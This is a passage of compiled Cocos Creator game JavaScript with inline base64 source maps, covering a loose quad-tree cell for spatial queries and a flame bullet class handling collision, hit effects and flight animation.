ICAgICAgICAgICBwaHlzaWNzTWFuYWdlci5lbmFibGVkID0gdHJ1ZTtcclxuICAgICAgICAgICAgcGh5c2ljc01hbmFnZXIuZW5hYmxlZEFjY3VtdWxhdG9yID0gZmFsc2U7XHJcblxyXG5cclxuICAgICAgICAgICAgcGh5c2ljc01hbmFnZXIuZGVidWdEcmF3RmxhZ3MgPVxyXG4gICAgICAgICAgICAgICAgMDtcclxuICAgICAgICAgICAgLy8gY2MuUGh5c2ljc01hbmFnZXIuRHJhd0JpdHMuZV9hYWJiQml0IHxcclxuICAgICAgICAgICAgLy9jYy5QaHlzaWNzTWFuYWdlci5EcmF3Qml0cy5lX2pvaW50Qml0IHxcclxuICAgICAgICAgICAgLy9jYy5QaHlzaWNzTWFuYWdlci5EcmF3Qml0cy5lX3NoYXBlQml0XHJcbiAgICAgICAgICAgIDsqL1xyXG5cclxuICAgICAgICAgICAgLyoqIOeisOaSnuajgOa1i+mFjee9riAqL1xyXG4gICAgICAgICAgICBsZXQgbWFuYWdlciA9IGNjLmRpcmVjdG9yLmdldENvbGxpc2lvbk1hbmFnZXIoKTtcclxuICAgICAgICAgICAgLy8gbWFuYWdlci5lbmFibGVkID0gdHJ1ZTtcclxuICAgICAgICAgICAgLy8gbWFuYWdlci5lbmFibGVkRGVidWdEcmF3ID0gdHJ1ZTtcclxuICAgICAgICAgICAgLy8gbWFuYWdlci5lbmFibGVkRHJhd0JvdW5kaW5nQm94ID0gdHJ1ZTtcclxuXHJcbiAgICAgICAgICAgIGNvbnNvbGUubG9nKGV4dC5pc0lwaG9uZVgsIFwiaXNJcGhvbmVYPT09PlwiKTtcclxuICAgICAgICAgICAgY29uc29sZS5sb2coZXh0LmlzTGFuZHNjYXBlLCBcImlzTGFuZHNjYXBlPT09PlwiKTtcclxuXHJcbiAgICAgICAgICAgIC8v5YWz6ZetZGVidWdcclxuICAgICAgICAgICAgaWYoIUFwcENvbmZpZy5pc0RlYnVnKXtcclxuICAgICAgICAgICAgICAgIGNvbnNvbGUubG9nID0gZnVuY3Rpb24gKCkge1xyXG5cclxuICAgICAgICAgICAgICAgIH07XHJcbiAgICAgICAgICAgIH1cclxuXHJcbiAgICAgICAgICAgIFZpZXcuY2xpY2tTb3VuZENvbW1hbmQgPSBcIkNsaWNrU291bmRDb21tYW5kXCI7XHJcblxyXG5cclxuICAgICAgICAgICAgLyoqIOivu+WPluWjsOmfs+mFjee9riAqL1xyXG4gICAgICAgICAgICBNdXNpYy5pbml0KCk7XHJcblxyXG4gICAgICAgICAgICBXb3JsZC5TdG9yYWdlLmluaXQoKTtcclxuXHJcbiAgICAgICAgICAgIC8qKiDlkI7lj7DliIflhaXliIflh7rlm57osIMtLS3lvJXmk47lt7Lnu4/lgZrkuobmmoLlgZzmuLjmiI/kuLvlvqrnjq/jgILljIXlkKvvvJrmuLjmiI/pgLvovpHvvIzmuLLmn5PvvIzkuovku7blpITnkIbvvIzog4zmma/pn7PkuZDlkozmiYDmnInpn7PmlYjjgILmiYDku6XmiJHku6zkuIDoiKzmg4XlhrXkuIvkuI3pnIDopoHlgZrku4DkuYggKi9cclxuICAgICAgICAgICAgLypjYy5nYW1lLm9uKGNjLmdhbWUuRVZFTlRfU0hPVywgZnVuY3Rpb24gKCkge1xyXG4gICAgICAgICAgICAgICAgY29uc29sZS5sb2coXCJjYy5nYW1lLkVWRU5UX1NIT1c9PT09PT09PT09PT0+XCIpO1xyXG4gICAgICAgICAgICB9KTtcclxuXHJcbiAgICAgICAgICAgIGNjLmdhbWUub24oY2MuZ2FtZS5FVkVOVF9ISURFLCBmdW5jdGlvbiAoKSB7XHJcbiAgICAgICAgICAgICAgICBjb25zb2xlLmxvZyhcImNjLmdhbWUuRVZFTlRfSElERT09PT09PT09PT09PT5cIik7XHJcbiAgICAgICAgICAgIH0pOyovXHJcblxyXG4gICAgICAgICAgICAvKiog5rOo5YaM5oum5oiq5ZmoICovXHJcbiAgICAgICAgICAgIEludGVyY2VwdG9yLnJlZ2lzdGVyKFwiT3BlblZpZXdDb21tYW5kXCIsIE9wZW5WaWV3SW50ZXJjZXB0b3IpO1xyXG4gICAgICAgICAgICBJbnRlcmNlcHRvci5yZWdpc3RlcihcIkNsb3NlVmlld0NvbW1hbmRcIiwgQ2xvc2VWaWV3SW50ZXJjZXB0b3IpO1xyXG4gICAgICAgICAgICBJbnRlcmNlcHRvci5yZWdpc3RlcihcIkxvYWRTY2VuZUNvbW1hbmRcIiwgTG9hZFNjZW5lSW50ZXJjZXRvcik7XHJcblxyXG5cclxuICAgICAgICAgICAgLyoqIOW8gOWni+WKoOi9vSAqL1xyXG5cclxuICAgICAgICAgICAgcmVzb2x2ZSh0cnVlKTtcclxuICAgICAgICB9KTtcclxuICAgIH1cclxufVxyXG4iXX0=
//------QC-SOURCE-SPLIT------

                (function() {
                    var nodeEnv = typeof require !== 'undefined' && typeof process !== 'undefined';
                    var __module = nodeEnv ? module : {exports:{}};
                    var __filename = 'preview-scripts/assets/script/quad-tree/LooseQuadTreeCell.js';
                    var __require = nodeEnv ? function (request) {
                        return cc.require(request);
                    } : function (request) {
                        return __quick_compile_project__.require(request, __filename);
                    };
                    function __define (exports, require, module) {
                        if (!nodeEnv) {__quick_compile_project__.registerModule(__filename, module);}"use strict";
cc._RF.push(module, '87e35DEagBNP5N9xxZ6MiIk', 'LooseQuadTreeCell');
// script/quad-tree/LooseQuadTreeCell.ts

Object.defineProperty(exports, "__esModule", { value: true });
var LooseQuadTree_1 = require("./LooseQuadTree");
var LooseQuadTreeCell = /** @class */ (function () {
    function LooseQuadTreeCell(level, index, bounds, children) {
        var _this = this;
        this.level = 0;
        this.index = 0;
        this.bounds = null;
        this.looseBounds = null;
        this.parent = null;
        /** 这里是根据索引来访问的，所以不能链表结构 */
        this.children = null;
        /** 这里可优化成链表，移除方便 */
        this._objects = [];
        /** 子节点对象的数量 */
        this._objectCount = 0;
        this.level = level;
        this.index = index;
        this.bounds = bounds;
        this.looseBounds = cc.rect(bounds.xMin - bounds.width / 2, bounds.yMin - bounds.height / 2, bounds.width * 2, bounds.height * 2);
        this.children = children;
        this.children.forEach(function (value) { return value.parent = _this; });
    }
    Object.defineProperty(LooseQuadTreeCell.prototype, "objectCount", {
        get: function () {
            return this._objectCount;
        },
        enumerable: false,
        configurable: true
    });
    Object.defineProperty(LooseQuadTreeCell.prototype, "objects", {
        get: function () {
            return this._objects;
        },
        enumerable: false,
        configurable: true
    });
    LooseQuadTreeCell.prototype.removeObject = function (region) {
        var index = this._objects.indexOf(region);
        if (index < 0) {
            console.error("remove not found cell==> level=" + region.level + " index=" + region.index);
            return;
        }
        this._objects.splice(index, 1);
        region.index = -1;
        region.level = -1;
        var cell = this;
        while (cell) {
            cell._objectCount--;
            cell = cell.parent;
        }
    };
    LooseQuadTreeCell.prototype.addObject = function (region) {
        this._objects.push(region);
        region.index = this.index;
        region.level = this.level;
        var cell = this;
        while (cell) {
            cell._objectCount++;
            cell = cell.parent;
        }
    };
    LooseQuadTreeCell.prototype.retrieve = function (rect, out) {
        //从根结点往下找
        if (this._objectCount > 0 && this.looseBounds.intersects(rect)) {
            LooseQuadTree_1.default.retrieveCount++;
            if (this._objects.length > 0) {
                out.push.apply(out, this._objects);
            }
            this.children.forEach(function (value) {
                if (value._objectCount > 0) {
                    value.retrieve(rect, out);
                }
            });
        }
    };
    return LooseQuadTreeCell;
}());
exports.default = LooseQuadTreeCell;

cc._RF.pop();
                    }
                    if (nodeEnv) {
                        __define(__module.exports, __require, __module);
                    }
                    else {
                        __quick_compile_project__.registerModuleFunc(__filename, function () {
                            __define(__module.exports, __require, __module);
                        });
                    }
                })();
//# sourceMappingURL=data:application/json;charset=utf-8;base64,eyJ2ZXJzaW9uIjozLCJzb3VyY2VzIjpbImFzc2V0cy9zY3JpcHQvcXVhZC10cmVlL0xvb3NlUXVhZFRyZWVDZWxsLnRzIl0sIm5hbWVzIjpbXSwibWFwcGluZ3MiOiI7Ozs7Ozs7Ozs7Ozs7Ozs7QUFFQSxpREFBNEM7QUFHNUM7SUFFSSwyQkFBWSxLQUFZLEVBQUUsS0FBWSxFQUFFLE1BQWMsRUFBRSxRQUFpQztRQUF6RixpQkFPQztRQUVELFVBQUssR0FBRyxDQUFDLENBQUM7UUFDVixVQUFLLEdBQUcsQ0FBQyxDQUFDO1FBQ1YsV0FBTSxHQUFXLElBQUksQ0FBQztRQUN0QixnQkFBVyxHQUFXLElBQUksQ0FBQztRQUMzQixXQUFNLEdBQXFCLElBQUksQ0FBQztRQUNoQywyQkFBMkI7UUFDM0IsYUFBUSxHQUE0QixJQUFJLENBQUM7UUFDekMsb0JBQW9CO1FBQ1osYUFBUSxHQUFxQixFQUFFLENBQUM7UUFFeEMsZUFBZTtRQUNQLGlCQUFZLEdBQUcsQ0FBQyxDQUFDO1FBbkJyQixJQUFJLENBQUMsS0FBSyxHQUFHLEtBQUssQ0FBQztRQUNuQixJQUFJLENBQUMsS0FBSyxHQUFHLEtBQUssQ0FBQztRQUNuQixJQUFJLENBQUMsTUFBTSxHQUFHLE1BQU0sQ0FBQztRQUNyQixJQUFJLENBQUMsV0FBVyxHQUFHLEVBQUUsQ0FBQyxJQUFJLENBQUMsTUFBTSxDQUFDLElBQUksR0FBQyxNQUFNLENBQUMsS0FBSyxHQUFDLENBQUMsRUFBRSxNQUFNLENBQUMsSUFBSSxHQUFDLE1BQU0sQ0FBQyxNQUFNLEdBQUMsQ0FBQyxFQUFFLE1BQU0sQ0FBQyxLQUFLLEdBQUMsQ0FBQyxFQUFFLE1BQU0sQ0FBQyxNQUFNLEdBQUMsQ0FBQyxDQUFDLENBQUM7UUFDckgsSUFBSSxDQUFDLFFBQVEsR0FBRyxRQUFRLENBQUM7UUFDekIsSUFBSSxDQUFDLFFBQVEsQ0FBQyxPQUFPLENBQUMsVUFBQSxLQUFLLElBQUksT0FBQSxLQUFLLENBQUMsTUFBTSxHQUFHLEtBQUksRUFBbkIsQ0FBbUIsQ0FBQyxDQUFDO0lBQ3hELENBQUM7SUFnQkQsc0JBQUksMENBQVc7YUFBZjtZQUNJLE9BQU8sSUFBSSxDQUFDLFlBQVksQ0FBQztRQUM3QixDQUFDOzs7T0FBQTtJQUVELHNCQUFJLHNDQUFPO2FBQVg7WUFDSSxPQUFPLElBQUksQ0FBQyxRQUFRLENBQUM7UUFDekIsQ0FBQzs7O09BQUE7SUFFRCx3Q0FBWSxHQUFaLFVBQWEsTUFBaUI7UUFDMUIsSUFBSSxLQUFLLEdBQUcsSUFBSSxDQUFDLFFBQVEsQ0FBQyxPQUFPLENBQUMsTUFBTSxDQUFDLENBQUM7UUFDMUMsSUFBSSxLQUFLLEdBQUcsQ0FBQyxFQUFDO1lBQ1YsT0FBTyxDQUFDLEtBQUssQ0FBQyxpQ0FBaUMsR0FBQyxNQUFNLENBQUMsS0FBSyxHQUFDLFNBQVMsR0FBQyxNQUFNLENBQUMsS0FBSyxDQUFDLENBQUM7WUFDckYsT0FBTztTQUNWO1FBQ0QsSUFBSSxDQUFDLFFBQVEsQ0FBQyxNQUFNLENBQUMsS0FBSyxFQUFFLENBQUMsQ0FBQyxDQUFDO1FBQy9CLE1BQU0sQ0FBQyxLQUFLLEdBQUcsQ0FBQyxDQUFDLENBQUM7UUFDbEIsTUFBTSxDQUFDLEtBQUssR0FBRyxDQUFDLENBQUMsQ0FBQztRQUNsQixJQUFJLElBQUksR0FBRyxJQUFJLENBQUM7UUFDaEIsT0FBTyxJQUFJLEVBQUM7WUFDUixJQUFJLENBQUMsWUFBWSxFQUFFLENBQUM7WUFDcEIsSUFBSSxHQUFHLElBQUksQ0FBQyxNQUFNLENBQUM7U0FDdEI7SUFDTCxDQUFDO0lBR0QscUNBQVMsR0FBVCxVQUFVLE1BQWlCO1FBQ3ZCLElBQUksQ0FBQyxRQUFRLENBQUMsSUFBSSxDQUFDLE1BQU0sQ0FBQyxDQUFDO1FBQzNCLE1BQU0sQ0FBQyxLQUFLLEdBQUcsSUFBSSxDQUFDLEtBQUssQ0FBQztRQUMxQixNQUFNLENBQUMsS0FBSyxHQUFHLElBQUksQ0FBQyxLQUFLLENBQUM7UUFDMUIsSUFBSSxJQUFJLEdBQUcsSUFBSSxDQUFDO1FBQ2hCLE9BQU8sSUFBSSxFQUFDO1lBQ1IsSUFBSSxDQUFDLFlBQVksRUFBRSxDQUFDO1lBQ3BCLElBQUksR0FBRyxJQUFJLENBQUMsTUFBTSxDQUFDO1NBQ3RCO0lBQ0wsQ0FBQztJQUVELG9DQUFRLEdBQVIsVUFBUyxJQUFZLEVBQUUsR0FBcUI7UUFDeEMsU0FBUztRQUNULElBQUksSUFBSSxDQUFDLFlBQVksR0FBRyxDQUFDLElBQUksSUFBSSxDQUFDLFdBQVcsQ0FBQyxVQUFVLENBQUMsSUFBSSxDQUFDLEVBQUM7WUFDM0QsdUJBQWEsQ0FBQyxhQUFhLEVBQUUsQ0FBQztZQUM5QixJQUFJLElBQUksQ0FBQyxRQUFRLENBQUMsTUFBTSxHQUFHLENBQUMsRUFBQztnQkFDekIsR0FBRyxDQUFDLElBQUksT0FBUixHQUFHLEVBQVMsSUFBSSxDQUFDLFFBQVEsRUFBRTthQUM5QjtZQUNELElBQUksQ0FBQyxRQUFRLENBQUMsT0FBTyxDQUFDLFVBQUEsS0FBSztnQkFDdkIsSUFBSSxLQUFLLENBQUMsWUFBWSxHQUFHLENBQUMsRUFBQztvQkFDdkIsS0FBSyxDQUFDLFFBQVEsQ0FBQyxJQUFJLEVBQUUsR0FBRyxDQUFDLENBQUM7aUJBQzdCO1lBQ0wsQ0FBQyxDQUFDLENBQUM7U0FDTjtJQUNMLENBQUM7SUFDTCx3QkFBQztBQUFELENBM0VBLEFBMkVDLElBQUEiLCJmaWxlIjoiIiwic291cmNlUm9vdCI6Ii8iLCJzb3VyY2VzQ29udGVudCI6WyJcclxuaW1wb3J0IEFBQkJSZWdpb24gZnJvbSBcIi4vQUFCQlJlZ2lvblwiO1xyXG5pbXBvcnQgTG9vc2VRdWFkVHJlZSBmcm9tIFwiLi9Mb29zZVF1YWRUcmVlXCI7XHJcblxyXG5cclxuZXhwb3J0IGRlZmF1bHQgY2xhc3MgTG9vc2VRdWFkVHJlZUNlbGwge1xyXG5cclxuICAgIGNvbnN0cnVjdG9yKGxldmVsOm51bWJlciwgaW5kZXg6bnVtYmVyLCBib3VuZHM6Y2MuUmVjdCwgY2hpbGRyZW46QXJyYXk8TG9vc2VRdWFkVHJlZUNlbGw+KXtcclxuICAgICAgICB0aGlzLmxldmVsID0gbGV2ZWw7XHJcbiAgICAgICAgdGhpcy5pbmRleCA9IGluZGV4O1xyXG4gICAgICAgIHRoaXMuYm91bmRzID0gYm91bmRzO1xyXG4gICAgICAgIHRoaXMubG9vc2VCb3VuZHMgPSBjYy5yZWN0KGJvdW5kcy54TWluLWJvdW5kcy53aWR0aC8yLCBib3VuZHMueU1pbi1ib3VuZHMuaGVpZ2h0LzIsIGJvdW5kcy53aWR0aCoyLCBib3VuZHMuaGVpZ2h0KjIpO1xyXG4gICAgICAgIHRoaXMuY2hpbGRyZW4gPSBjaGlsZHJlbjtcclxuICAgICAgICB0aGlzLmNoaWxkcmVuLmZvckVhY2godmFsdWUgPT4gdmFsdWUucGFyZW50ID0gdGhpcyk7XHJcbiAgICB9XHJcblxyXG4gICAgbGV2ZWwgPSAwO1xyXG4gICAgaW5kZXggPSAwO1xyXG4gICAgYm91bmRzOmNjLlJlY3QgPSBudWxsO1xyXG4gICAgbG9vc2VCb3VuZHM6Y2MuUmVjdCA9IG51bGw7XHJcbiAgICBwYXJlbnQ6TG9vc2VRdWFkVHJlZUNlbGwgPSBudWxsO1xyXG4gICAgLyoqIOi/memHjOaYr+agueaNrue0ouW8leadpeiuv+mXrueahO+8jOaJgOS7peS4jeiDvemTvuihqOe7k+aehCAqL1xyXG4gICAgY2hpbGRyZW46QXJyYXk8TG9vc2VRdWFkVHJlZUNlbGw+ID0gbnVsbDtcclxuICAgIC8qKiDov5nph4zlj6/kvJjljJbmiJDpk77ooajvvIznp7vpmaTmlrnkvr8gKi9cclxuICAgIHByaXZhdGUgX29iamVjdHM6QXJyYXk8QUFCQlJlZ2lvbj4gPSBbXTtcclxuXHJcbiAgICAvKiog5a2Q6IqC54K55a+56LGh55qE5pWw6YePICovXHJcbiAgICBwcml2YXRlIF9vYmplY3RDb3VudCA9IDA7XHJcblxyXG5cclxuICAgIGdldCBvYmplY3RDb3VudCgpOiBudW1iZXIge1xyXG4gICAgICAgIHJldHVybiB0aGlzLl9vYmplY3RDb3VudDtcclxuICAgIH1cclxuXHJcbiAgICBnZXQgb2JqZWN0cygpOiBBcnJheTxBQUJCUmVnaW9uPiB7XHJcbiAgICAgICAgcmV0dXJuIHRoaXMuX29iamVjdHM7XHJcbiAgICB9XHJcblxyXG4gICAgcmVtb3ZlT2JqZWN0KHJlZ2lvbjpBQUJCUmVnaW9uKXtcclxuICAgICAgICBsZXQgaW5kZXggPSB0aGlzLl9vYmplY3RzLmluZGV4T2YocmVnaW9uKTtcclxuICAgICAgICBpZiAoaW5kZXggPCAwKXtcclxuICAgICAgICAgICAgY29uc29sZS5lcnJvcihcInJlbW92ZSBub3QgZm91bmQgY2VsbD09PiBsZXZlbD1cIityZWdpb24ubGV2ZWwrXCIgaW5kZXg9XCIrcmVnaW9uLmluZGV4KTtcclxuICAgICAgICAgICAgcmV0dXJuO1xyXG4gICAgICAgIH1cclxuICAgICAgICB0aGlzLl9vYmplY3RzLnNwbGljZShpbmRleCwgMSk7XHJcbiAgICAgICAgcmVnaW9uLmluZGV4ID0gLTE7XHJcbiAgICAgICAgcmVnaW9uLmxldmVsID0gLTE7XHJcbiAgICAgICAgbGV0IGNlbGwgPSB0aGlzO1xyXG4gICAgICAgIHdoaWxlIChjZWxsKXtcclxuICAgICAgICAgICAgY2VsbC5fb2JqZWN0Q291bnQtLTtcclxuICAgICAgICAgICAgY2VsbCA9IGNlbGwucGFyZW50O1xyXG4gICAgICAgIH1cclxuICAgIH1cclxuXHJcblxyXG4gICAgYWRkT2JqZWN0KHJlZ2lvbjpBQUJCUmVnaW9uKXtcclxuICAgICAgICB0aGlzLl9vYmplY3RzLnB1c2gocmVnaW9uKTtcclxuICAgICAgICByZWdpb24uaW5kZXggPSB0aGlzLmluZGV4O1xyXG4gICAgICAgIHJlZ2lvbi5sZXZlbCA9IHRoaXMubGV2ZWw7XHJcbiAgICAgICAgbGV0IGNlbGwgPSB0aGlzO1xyXG4gICAgICAgIHdoaWxlIChjZWxsKXtcclxuICAgICAgICAgICAgY2VsbC5fb2JqZWN0Q291bnQrKztcclxuICAgICAgICAgICAgY2VsbCA9IGNlbGwucGFyZW50O1xyXG4gICAgICAgIH1cclxuICAgIH1cclxuXHJcbiAgICByZXRyaWV2ZShyZWN0OmNjLlJlY3QsIG91dDpBcnJheTxBQUJCUmVnaW9uPil7XHJcbiAgICAgICAgLy/ku47moLnnu5PngrnlvoDkuIvmib5cclxuICAgICAgICBpZiAodGhpcy5fb2JqZWN0Q291bnQgPiAwICYmIHRoaXMubG9vc2VCb3VuZHMuaW50ZXJzZWN0cyhyZWN0KSl7XHJcbiAgICAgICAgICAgIExvb3NlUXVhZFRyZWUucmV0cmlldmVDb3VudCsrO1xyXG4gICAgICAgICAgICBpZiAodGhpcy5fb2JqZWN0cy5sZW5ndGggPiAwKXtcclxuICAgICAgICAgICAgICAgIG91dC5wdXNoKC4uLnRoaXMuX29iamVjdHMpO1xyXG4gICAgICAgICAgICB9XHJcbiAgICAgICAgICAgIHRoaXMuY2hpbGRyZW4uZm9yRWFjaCh2YWx1ZSA9PiB7XHJcbiAgICAgICAgICAgICAgICBpZiAodmFsdWUuX29iamVjdENvdW50ID4gMCl7XHJcbiAgICAgICAgICAgICAgICAgICAgdmFsdWUucmV0cmlldmUocmVjdCwgb3V0KTtcclxuICAgICAgICAgICAgICAgIH1cclxuICAgICAgICAgICAgfSk7XHJcbiAgICAgICAgfVxyXG4gICAgfVxyXG59XHJcbiJdfQ==
//------QC-SOURCE-SPLIT------

                (function() {
                    var nodeEnv = typeof require !== 'undefined' && typeof process !== 'undefined';
                    var __module = nodeEnv ? module : {exports:{}};
                    var __filename = 'preview-scripts/assets/script/app/entities/bullet/BulletHuoYan.js';
                    var __require = nodeEnv ? function (request) {
                        return cc.require(request);
                    } : function (request) {
                        return __quick_compile_project__.require(request, __filename);
                    };
                    function __define (exports, require, module) {
                        if (!nodeEnv) {__quick_compile_project__.registerModule(__filename, module);}"use strict";
cc._RF.push(module, 'edd203mtm9Lw4Q0h6mhYNeR', 'BulletHuoYan');
// script/app/entities/bullet/BulletHuoYan.ts

Object.defineProperty(exports, "__esModule", { value: true });
var Bullet_1 = require("./Bullet");
var _a = cc._decorator, ccclass = _a.ccclass, property = _a.property;
var BulletHuoYan = /** @class */ (function (_super) {
    __extends(BulletHuoYan, _super);
    function BulletHuoYan() {
        return _super !== null && _super.apply(this, arguments) || this;
    }
    BulletHuoYan.prototype.onCollisionEnter = function (other, self) {
        var _this = this;
        _super.prototype.onCollisionEnter.call(this, other, self);
        var action = cc.repeatForever(cc.sequence(cc.delayTime(0.3), cc.callFunc(function () {
            _super.prototype.onCollisionEnter.call(_this, other, self);
        })));
        action.setTag(1388);
        other.node.stopActionByTag(1388);
        other.node.runAction(action);
    };
    BulletHuoYan.prototype.onCollisionExit = function (other, self) {
        other.node.stopActionByTag(1388);
    };
    BulletHuoYan.prototype.strike = function (other, self) {
        var gameBulletsController = window['GameBulletsController'];
        var bulletStrike = gameBulletsController.getInactiveBulletStrike(this.bulletId);
        bulletStrike.node.active = true;
        bulletStrike.node.position = cc.v2();
        bulletStrike.node.rotation = this.node.rotation;
        bulletStrike.node.setContentSize(other.node.getContentSize());
        bulletStrike.node.removeFromParent(false);
        bulletStrike.node.setParent(other.node);
        var spriteNode = bulletStrike.spriteNode;
        bulletStrike.node.rotation = Math.random() * 360;
        bulletStrike.node.runAction(cc.sequence(cc.repeat(cc.sequence(cc.delayTime(0.05), cc.callFunc(function () {
            spriteNode.active = !spriteNode.active;
            // bulletStrike.node.rotation = Math.random()*360;
        })), 6), cc.callFunc(function () {
            bulletStrike.node.stopAllActions();
            bulletStrike.node.active = false;
            bulletStrike.node.removeFromParent(false);
            bulletStrike.node.setParent(gameBulletsController.bulletLayer);
        })));
    };
    BulletHuoYan.prototype.fly = function (dir, distance, speed) {
        var _this = this;
        speed = 400;
        this.node.rotation = 90 - cc.misc.radiansToDegrees(Math.atan2(dir.y, dir.x));
        var duration = distance / speed;
        this.node.runAction(cc.sequence(cc.moveBy(duration, dir.mul(distance)).easing(cc.easeSineOut()), cc.callFunc(function () {
            _this.node.active = false;
        })));
        this.node.scale = 0.3;
        this.node.opacity = 255;
        this.node.runAction(cc.spawn(cc.scaleTo(duration, distance / 100), cc.fadeTo(duration, 50)));
    };
    BulletHuoYan = __decorate([
        ccclass
    ], BulletHuoYan);
    return BulletHuoYan;
}(Bullet_1.default));
exports.default = BulletHuoYan;

cc._RF.pop();
                    }
                    if (nodeEnv) {
                        __define(__module.exports, __require, __module);
                    }
                    else {
                        __quick_compile_project__.registerModuleFunc(__filename, function () {
                            __define(__module.exports, __require, __module);
                        });
                    }
                })();
//# sourceMappingURL=data:application/json;charset=utf-8;base64,eyJ2ZXJzaW9uIjozLCJzb3VyY2VzIjpbImFzc2V0cy9zY3JpcHQvYXBwL2VudGl0aWVzL2J1bGxldC9CdWxsZXRIdW9ZYW4udHMiXSwibmFtZXMiOltdLCJtYXBwaW5ncyI6Ijs7Ozs7Ozs7Ozs7Ozs7OztBQUNBLG1DQUE4QjtBQUd4QixJQUFBLEtBQXNCLEVBQUUsQ0FBQyxVQUFVLEVBQWxDLE9BQU8sYUFBQSxFQUFFLFFBQVEsY0FBaUIsQ0FBQztBQUcxQztJQUEwQyxnQ0FBTTtJQUFoRDs7SUEwREEsQ0FBQztJQXhERyx1Q0FBZ0IsR0FBaEIsVUFBaUIsS0FBSyxFQUFFLElBQUk7UUFBNUIsaUJBUUM7UUFQRyxpQkFBTSxnQkFBZ0IsWUFBQyxLQUFLLEVBQUUsSUFBSSxDQUFDLENBQUM7UUFDcEMsSUFBSSxNQUFNLEdBQUcsRUFBRSxDQUFDLGFBQWEsQ0FBQyxFQUFFLENBQUMsUUFBUSxDQUFDLEVBQUUsQ0FBQyxTQUFTLENBQUMsR0FBRyxDQUFDLEVBQUUsRUFBRSxDQUFDLFFBQVEsQ0FBQztZQUNyRSxpQkFBTSxnQkFBZ0IsYUFBQyxLQUFLLEVBQUUsSUFBSSxDQUFDLENBQUM7UUFDeEMsQ0FBQyxDQUFDLENBQUMsQ0FBQyxDQUFDO1FBQ0wsTUFBTSxDQUFDLE1BQU0sQ0FBQyxJQUFJLENBQUMsQ0FBQztRQUNwQixLQUFLLENBQUMsSUFBSSxDQUFDLGVBQWUsQ0FBQyxJQUFJLENBQUMsQ0FBQztRQUNqQyxLQUFLLENBQUMsSUFBSSxDQUFDLFNBQVMsQ0FBQyxNQUFNLENBQUMsQ0FBQztJQUNqQyxDQUFDO0lBRUQsc0NBQWUsR0FBZixVQUFnQixLQUFLLEVBQUUsSUFBSTtRQUN2QixLQUFLLENBQUMsSUFBSSxDQUFDLGVBQWUsQ0FBQyxJQUFJLENBQUMsQ0FBQztJQUNyQyxDQUFDO0lBR0QsNkJBQU0sR0FBTixVQUFPLEtBQUssRUFBRSxJQUFJO1FBQ2QsSUFBSSxxQkFBcUIsR0FBRyxNQUFNLENBQUMsdUJBQXVCLENBQUMsQ0FBQztRQUM1RCxJQUFJLFlBQVksR0FBRyxxQkFBcUIsQ0FBQyx1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